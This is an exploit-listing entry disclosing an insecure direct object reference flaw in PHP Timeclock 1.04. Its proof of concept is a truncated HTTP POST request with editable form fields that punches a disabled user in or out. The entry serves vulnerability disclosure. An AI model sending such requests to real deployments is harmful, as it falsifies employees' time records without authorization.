# Exploit Title: PHP Timeclock 1.04 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://sourceforge.net/projects/timeclock/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SchoolMate
## Version: v1.04
## Exploit Description:
## PHP Timeclock v1.04 suffers from IDOR - Broken Access Control Vulnerability allowing attacker to punch in and punch out a user who is disabled(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /timeclock.php HTTP/1.1
...

left_fullname=user2(CHANGE HERE)&employee_passwd=user2test(CHANGE HERE)&left_inout=break&left_notes=user22note&submit_button=Submit
```